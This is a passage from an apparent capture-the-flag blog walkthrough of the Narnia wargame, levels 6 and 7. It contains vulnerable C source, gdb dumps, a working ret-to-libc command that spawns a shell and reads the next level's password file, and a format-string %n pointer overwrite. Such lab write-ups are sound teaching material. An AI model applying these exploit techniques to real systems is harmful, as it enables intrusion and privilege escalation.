        &lt;span class="k"&gt;for&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
                &lt;span class="n"&gt;memset&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="sc"&gt;'\0'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;strlen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;]));&lt;/span&gt;

        &lt;span class="n"&gt;strcpy&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;b1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;
        &lt;span class="n"&gt;strcpy&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;b2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;
        &lt;span class="c1"&gt;//if(((unsigned long)fp &amp;amp; 0xff000000) == 0xff000000)
&lt;/span&gt;        &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(((&lt;/span&gt;&lt;span class="kt"&gt;unsigned&lt;/span&gt; &lt;span class="kt"&gt;long&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="n"&gt;fp&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt; &lt;span class="mh"&gt;0xff000000&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;get_sp&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt;
                &lt;span class="n"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="n"&gt;fp&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;b1&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

        &lt;span class="n"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;In this rather complicated looking listing we notice a few things:&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;line 17 is a function pointer to &lt;code&gt;puts&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;line 33 calls the function &lt;code&gt;fp&lt;/code&gt; points to&lt;/li&gt;
&lt;li&gt;line 31 prevents &lt;code&gt;fp&lt;/code&gt; from pointing to anything in our frame&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The last lines means we need to point &lt;code&gt;fp&lt;/code&gt; to a call in a system library.
This is going to be a &lt;a class="reference external" href="https://en.wikipedia.org/wiki/Return-to-libc_attack"&gt;ret to libc attack&lt;/a&gt;. We
need to find the location of the function we want to execute. We want a shell, so our
best option would be to execute &lt;code&gt;system('/bin/sh')&lt;/code&gt;. As luck would have it, &lt;code&gt;puts&lt;/code&gt; and
&lt;code&gt;system&lt;/code&gt; both have the same function definition: &lt;code&gt;int system(const char *command);&lt;/code&gt; and
&lt;code&gt;int puts(const char *s);&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Let's fire up gdb and figure out our addresses.&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;narnia6&amp;#64;melinda:/narnia$&lt;/span&gt; gdb ./narnia6 -q
&lt;span class="go"&gt;Reading symbols from ./narnia6...(no debugging symbols found)...done.
(gdb) disass main
Dump of assembler code for function main:
   0x08048559 &amp;lt;+0&amp;gt;:     push   %ebp
   0x0804855a &amp;lt;+1&amp;gt;:     mov    %esp,%ebp
   0x0804855c &amp;lt;+3&amp;gt;:     push   %ebx
   0x0804855d &amp;lt;+4&amp;gt;:     and    $0xfffffff0,%esp
   0x08048560 &amp;lt;+7&amp;gt;:     sub    $0x30,%esp

    &amp;lt;-- snip --&amp;gt;

   0x0804869b &amp;lt;+322&amp;gt;:   movl   $0xffffffff,(%esp)
   0x080486a2 &amp;lt;+329&amp;gt;:   call   0x8048410 &amp;lt;exit&amp;#64;plt&amp;gt;
   0x080486a7 &amp;lt;+334&amp;gt;:   lea    0x20(%esp),%eax
   0x080486ab &amp;lt;+338&amp;gt;:   mov    %eax,(%esp)
   0x080486ae &amp;lt;+341&amp;gt;:   mov    0x28(%esp),%eax
   0x080486b2 &amp;lt;+345&amp;gt;:   call   *%eax                &amp;lt;-- calling *fp*
   0x080486b4 &amp;lt;+347&amp;gt;:   movl   $0x1,(%esp)
   0x080486bb &amp;lt;+354&amp;gt;:   call   0x8048410 &amp;lt;exit&amp;#64;plt&amp;gt;
End of assembler dump.

(gdb) break *0x080486b2
Breakpoint 1 at 0x80486b2
(gdb) r aaaaaaaabbbb ccccccccdddd
Starting program: /games/narnia/narnia6 aaaaaaaabbbb ccccccccdddd

Breakpoint 1, 0x080486b2 in main ()
(gdb) x/50wx $esp
0xffffd680:     0xffffd6a0      0xffffd8ac      0x00000021      0x08048712
0xffffd690:     0x00000003      0xffffd754      0x63636363      0x63636363
0xffffd6a0:     0x64646464      0x61616100      0x62626262      0x00000000
0xffffd6b0:     0x080486c0      0xf7fca000      0x00000000      0xf7e3ca63
0xffffd6c0:     0x00000003      0xffffd754      0xffffd764      0xf7feacea
0xffffd6d0:     0x00000003      0xffffd754      0xffffd6f4      0x08049978
0xffffd6e0:     0x08048290      0xf7fca000      0x00000000      0x00000000
0xffffd6f0:     0x00000000      0x32aaee13      0x0a932a03      0x00000000
0xffffd700:     0x00000000      0x00000000      0x00000003      0x08048450
0xffffd710:     0x00000000      0xf7ff0500      0xf7e3c979      0xf7ffd000
0xffffd720:     0x00000003      0x08048450      0x00000000      0x08048471
0xffffd730:     0x08048559      0x00000003      0xffffd754      0x080486c0
0xffffd740:     0x08048730      0xf7feb180
(gdb) p system
&lt;/span&gt;&lt;span class="nv"&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt;&lt;span class="nv"&gt;1&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;&amp;lt;text variable, no debug info&amp;gt;&lt;span class="o"&gt;}&lt;/span&gt; 0xf7e62cd0 &amp;lt;system&amp;gt;
&lt;span class="go"&gt;(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x62626262 in ?? ()&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;What I did here was to disassemble the &lt;code&gt;main&lt;/code&gt; function and find out where
&lt;code&gt;fp&lt;/code&gt; is getting called, so that I can set a breakpoint on it. Then I
run the binary and inspect the stack before the call to &lt;code&gt;fp&lt;/code&gt;. What we see is
that &lt;code&gt;$esp&lt;/code&gt; points to &lt;code&gt;0xffffd6a0&lt;/code&gt;, which is where the last 4 values of
&lt;code&gt;b2&lt;/code&gt; are stored. This is also the argument that will be passed to the &lt;code&gt;fp&lt;/code&gt; call.
Function arguments are pushed onto the stack before a function is called. So
We want this to point to &lt;code&gt;/bin/sh&lt;/code&gt;, and we want &lt;code&gt;fp&lt;/code&gt; to point to &lt;code&gt;system&lt;/code&gt;. This is
the reason for the &lt;code&gt;p system&lt;/code&gt;, it tells us the location of &lt;code&gt;system&lt;/code&gt;.
Also note that our &lt;code&gt;segfault&lt;/code&gt; is showing us the last
4 digits of &lt;code&gt;b1&lt;/code&gt;. Perfect, I can use that to overwrite &lt;code&gt;fp&lt;/code&gt; with the address of
&lt;code&gt;system&lt;/code&gt; and I should be good to go.&lt;/p&gt;
&lt;p&gt;As this is a little more advanced, let's go over the steps:&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;Get the address of the argument to whatever &lt;code&gt;fp&lt;/code&gt; points to&lt;/li&gt;
&lt;li&gt;Figure out how to overwrite that with our argument&lt;/li&gt;
&lt;li&gt;Get the address of &lt;code&gt;system&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Overwrite what &lt;code&gt;fp&lt;/code&gt; points to with &lt;code&gt;system&lt;/code&gt;'s address&lt;/li&gt;
&lt;li&gt;Assemble payload and hopefully get a shell&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;So the last step:&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;narnia6&amp;#64;melinda:/narnia$&lt;/span&gt; /games/narnia/narnia6 &lt;span class="sb"&gt;`&lt;/span&gt;python -c &lt;span class="s2"&gt;&amp;quot;print 'a'*8 + '\xd0\x2c\xe6\xf7' +' '+ 'b'*8 + '/bin/sh'&amp;quot;&lt;/span&gt;&lt;span class="sb"&gt;`&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt; whoami
&lt;span class="go"&gt;narnia7
&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; cat /etc/narnia_pass/narnia7
&lt;span class="go"&gt;[password]&lt;/span&gt;
&lt;/pre&gt;
&lt;/div&gt;
&lt;div class="section" id="level-07"&gt;
&lt;h2&gt;Level 07&lt;/h2&gt;
&lt;pre class="code c literal-block"&gt;
&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;
#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;
#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;
#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;
#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;
&lt;/span&gt;
&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;goodfunction&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;hackedfunction&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;

&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;vuln&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;const&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;
    &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;128&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
    &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;ptrf&lt;/span&gt;&lt;span class="p"&gt;)();&lt;/span&gt;

    &lt;span class="n"&gt;memset&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
    &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;goodfunction() = %p&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;goodfunction&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;hackedfunction() = %p&lt;/span&gt;&lt;span class="se"&gt;\n\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;hackedfunction&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

    &lt;span class="n"&gt;ptrf&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;goodfunction&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;before : ptrf() = %p (%p)&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;ptrf&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;ptrf&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

    &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;I guess you want to come to the hackedfunction...&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="n"&gt;sleep&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="n"&gt;ptrf&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;goodfunction&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

    &lt;span class="n"&gt;snprintf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt; &lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;ptrf&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;argc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;argc&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;
            &lt;span class="n"&gt;fprintf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;stderr&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;Usage: %s &amp;lt;buffer&amp;gt;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;
            &lt;span class="n"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="n"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;vuln&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]));&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;goodfunction&lt;/span&gt;&lt;span class="p"&gt;(){&lt;/span&gt;
    &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Welcome to the goodfunction, but i said the Hackedfunction..&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="n"&gt;fflush&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;stdout&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;hackedfunction&lt;/span&gt;&lt;span class="p"&gt;(){&lt;/span&gt;
    &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Way to go!!!!&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="n"&gt;fflush&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;stdout&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="n"&gt;system&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;The presence of &lt;code&gt;snprintf&lt;/code&gt; indicates that this will be another format string attack.
Great, another one of my least favourites. This should help imprint it on my
brain though, so let's attack this&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="go"&gt;(gdb) disass vuln
Dump of assembler code for function vuln:
   0x080485cd &amp;lt;+0&amp;gt;:     push   %ebp
   0x080485ce &amp;lt;+1&amp;gt;:     mov    %esp,%ebp
   0x080485d0 &amp;lt;+3&amp;gt;:     sub    $0xa8,%esp
   0x080485d6 &amp;lt;+9&amp;gt;:     movl   $0x80,0x8(%esp)
   0x080485de &amp;lt;+17&amp;gt;:    movl   $0x0,0x4(%esp)
   0x080485e6 &amp;lt;+25&amp;gt;:    lea    -0x88(%ebp),%eax
   0x080485ec &amp;lt;+31&amp;gt;:    mov    %eax,(%esp)
   0x080485ef &amp;lt;+34&amp;gt;:    call   0x80484b0 &amp;lt;memset&amp;#64;plt&amp;gt;
   0x080485f4 &amp;lt;+39&amp;gt;:    movl   $0x80486e0,0x4(%esp)
   0x080485fc &amp;lt;+47&amp;gt;:    movl   $0x80487d0,(%esp)
   0x08048603 &amp;lt;+54&amp;gt;:    call   0x8048420 &amp;lt;printf&amp;#64;plt&amp;gt;
   0x08048608 &amp;lt;+59&amp;gt;:    movl   $0x8048706,0x4(%esp)
   0x08048610 &amp;lt;+67&amp;gt;:    movl   $0x80487e5,(%esp)
   0x08048617 &amp;lt;+74&amp;gt;:    call   0x8048420 &amp;lt;printf&amp;#64;plt&amp;gt;
   0x0804861c &amp;lt;+79&amp;gt;:    movl   $0x80486e0,-0x8c(%ebp)
   0x08048626 &amp;lt;+89&amp;gt;:    mov    -0x8c(%ebp),%eax
   0x0804862c &amp;lt;+95&amp;gt;:    lea    -0x8c(%ebp),%edx
   0x08048632 &amp;lt;+101&amp;gt;:   mov    %edx,0x8(%esp)
   0x08048636 &amp;lt;+105&amp;gt;:   mov    %eax,0x4(%esp)
   0x0804863a &amp;lt;+109&amp;gt;:   movl   $0x80487fd,(%esp)
   0x08048641 &amp;lt;+116&amp;gt;:   call   0x8048420 &amp;lt;printf&amp;#64;plt&amp;gt;
   0x08048646 &amp;lt;+121&amp;gt;:   movl   $0x8048818,(%esp)
   0x0804864d &amp;lt;+128&amp;gt;:   call   0x8048450 &amp;lt;puts&amp;#64;plt&amp;gt;
   0x08048652 &amp;lt;+133&amp;gt;:   movl   $0x2,(%esp)
   0x08048659 &amp;lt;+140&amp;gt;:   call   0x8048440 &amp;lt;sleep&amp;#64;plt&amp;gt;
   0x0804865e &amp;lt;+145&amp;gt;:   movl   $0x80486e0,-0x8c(%ebp)
   0x08048668 &amp;lt;+155&amp;gt;:   mov    0x8(%ebp),%eax
   0x0804866b &amp;lt;+158&amp;gt;:   mov    %eax,0x8(%esp)
   0x0804866f &amp;lt;+162&amp;gt;:   movl   $0x80,0x4(%esp)
   0x08048677 &amp;lt;+170&amp;gt;:   lea    -0x88(%ebp),%eax
   0x0804867d &amp;lt;+176&amp;gt;:   mov    %eax,(%esp)
   0x08048680 &amp;lt;+179&amp;gt;:   call   0x80484c0 &amp;lt;snprintf&amp;#64;plt&amp;gt;
   0x08048685 &amp;lt;+184&amp;gt;:   mov    -0x8c(%ebp),%eax
   0x0804868b &amp;lt;+190&amp;gt;:   call   *%eax
   0x0804868d &amp;lt;+192&amp;gt;:   leave
   0x0804868e &amp;lt;+193&amp;gt;:   ret
End of assembler dump.
(gdb) break *0x08048685&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;So disassmble the &lt;code&gt;vuln&lt;/code&gt; function and set a break point just
before the call of the function pointer. In the process of this challenge
I learned of a nice way to determine the number of &lt;code&gt;%x&lt;/code&gt; you need. Using
&lt;code&gt;ltrace&lt;/code&gt; it's possible to increment the number of &lt;code&gt;%x&lt;/code&gt; 's until you
see your string in the output again. I'll paste only the correcy output here&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;narnia7&amp;#64;melinda:/narnia$&lt;/span&gt; ltrace ./narnia7 &lt;span class="sb"&gt;`&lt;/span&gt;python -c &lt;span class="s2"&gt;&amp;quot;print 'aaaabbbb' + '%x'*7&amp;quot;&lt;/span&gt;&lt;span class="sb"&gt;`&lt;/span&gt;
&lt;span class="go"&gt;__libc_start_main(0x804868f, 2, 0xffffd774, 0x8048740 &amp;lt;unfinished ...&amp;gt;
memset(0xffffd630, '\0', 128)                                = 0xffffd630
printf(&amp;quot;goodfunction() = %p\n&amp;quot;, 0x80486e0goodfunction() = 0x80486e0
)                   = 27
printf(&amp;quot;hackedfunction() = %p\n\n&amp;quot;, 0x8048706hackedfunction() = 0x8048706

)               = 30
printf(&amp;quot;before : ptrf() = %p (%p)\n&amp;quot;, 0x80486e0, 0xffffd62cbefore : ptrf() = 0x80486e0 (0xffffd62c)
) = 41
puts(&amp;quot;I guess you want to come to the &amp;quot;...I guess you want to come to the hackedfunction...
)                  = 50
sleep(2)                                                     = 0
snprintf(&amp;quot;aaaabbbb8048238ffffd688f7ffda940&amp;quot;..., 128, &amp;quot;aaaabbbb%x%x%x%x%x%x%x&amp;quot;, 0x8048238, 0xffffd688, 0xf7ffda94, 0, 0x80486e0, 0x61616161, 0x62626262) = 55
puts(&amp;quot;Welcome to the goodfunction, but&amp;quot;...Welcome to the goodfunction, but i said the Hackedfunction..
)                  = 61
fflush(0xf7fcaac0)                                           = 0
exit(0 &amp;lt;no return ...&amp;gt;
+++ exited (status 0) +++&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;You can see the &lt;em&gt;aaaa&lt;/em&gt; and &lt;em&gt;bbbb&lt;/em&gt; at line 14. So we have 7 &lt;code&gt;%x&lt;/code&gt; to get the second value.&lt;/p&gt;
&lt;p&gt;Let's take a look at the stack with that input&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="go"&gt;(gdb) r $(python -c &amp;quot;print 'aaaabbbb' + '%x'*7&amp;quot;)
Starting program: /games/narnia/narnia7 $(python -c &amp;quot;print 'aaaabbbb' + '%x'*7&amp;quot;)
goodfunction() = 0x80486e0
hackedfunction() = 0x8048706

before : ptrf() = 0x80486e0 (0xffffd60c)
I guess you want to come to the hackedfunction...

Breakpoint 1, 0x08048685 in vuln ()
(gdb) x/40wx $esp
0xffffd5f0:     0xffffd610      0x00000080      0xffffd8a2      0x08048238
0xffffd600:     0xffffd668      0xf7ffda94      0x00000000      0x080486e0
0xffffd610:     0x61616161      0x62626262      0x38343038      0x66383332
0xffffd620:     0x64666666      0x66383636      0x64666637      0x30343961
0xffffd630:     0x38343038      0x36306536      0x36313631      0x36313631
0xffffd640:     0x36323632      0x00323632      0x00000000      0x00000000
0xffffd650:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd660:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd670:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd680:     0x00000000      0x00000000      0x00000000      0x00000000&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;So at &lt;code&gt;0xffffd60c&lt;/code&gt; is the address of &lt;code&gt;goodfunction&lt;/code&gt;. We need to overwrite that
to point to &lt;code&gt;0x8048706&lt;/code&gt;, our &lt;code&gt;hackedfunction&lt;/code&gt;. So as before in &lt;a class="reference external" href="http://unlogic.co.uk/2015/04/10/solving-narnia-part-2/#level-05"&gt;level 05&lt;/a&gt;
we use &lt;code&gt;%n&lt;/code&gt; to try and overwrite this value.&lt;/p&gt;
&lt;pre class="code bash literal-block"&gt;
&lt;span class="o"&gt;(&lt;/span&gt;gdb&lt;span class="o"&gt;)&lt;/span&gt; r &lt;span class="k"&gt;$(&lt;/span&gt;python -c &lt;span class="s2"&gt;&amp;quot;print 'aaaa\x0c\xd6\xff\xff' + '%x'*6 + '%n'&amp;quot;&lt;/span&gt;&lt;span class="k"&gt;)&lt;/span&gt;

Starting program: /games/narnia/narnia7 &lt;span class="k"&gt;$(&lt;/span&gt;python -c &lt;span class="s2"&gt;&amp;quot;print 'aaaa\x0c\xd6\xff\xff' + '%x'*6 + '%n'&amp;quot;&lt;/span&gt;&lt;span class="k"&gt;)&lt;/span&gt;
goodfunction&lt;span class="o"&gt;()&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; 0x80486e0
hackedfunction&lt;span class="o"&gt;()&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; 0x8048706

before : ptrf&lt;span class="o"&gt;()&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; 0x80486e0 &lt;span class="o"&gt;(&lt;/span&gt;0xffffd60c&lt;span class="o"&gt;)&lt;/span&gt;
I guess you want to come to the hackedfunction...

Breakpoint 1, 0x08048685 in vuln &lt;span class="o"&gt;()&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;gdb&lt;span class="o"&gt;)&lt;/span&gt; x/40wx &lt;span class="nv"&gt;$esp&lt;/span&gt;
0xffffd5f0:     0xffffd610      0x00000080      0xffffd8a2      0x08048238
0xffffd600:     0xffffd668      0xf7ffda94      0x00000000      0x0000002f
0xffffd610:     0x61616161      0xffffd60c      0x38343038      0x66383332
0xffffd620:     0x64666666      0x66383636      0x64666637      0x30343961
0xffffd630:     0x38343038      0x36306536      0x36313631      0x00313631
